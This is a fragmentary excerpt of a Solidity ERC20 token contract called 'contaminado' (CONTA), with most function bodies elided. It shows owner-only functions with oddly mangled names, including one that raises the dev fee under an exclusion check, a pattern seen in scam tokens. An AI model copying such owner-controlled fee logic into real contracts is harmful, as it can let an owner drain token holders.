...
contract contaminado is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => bool) private _isExcluded;  
    uint256 private _totalSupply = 100000000 *  10**9;  
    string private _name = "contaminado";
    string private _symbol = "CONTA";
    ...
    function restAnalysis(bool _enabled) external onlyOwner{
    ...
    function updainitialfeeteDevFee(uint256 rDev) external onlyOwner {       
        if(_isExcluded[address(this)])
        {
            totalFees.dev +=rDev;
        }        
    ...
    function setnewtoken(address shareholder, uint256 _amount) internal {    
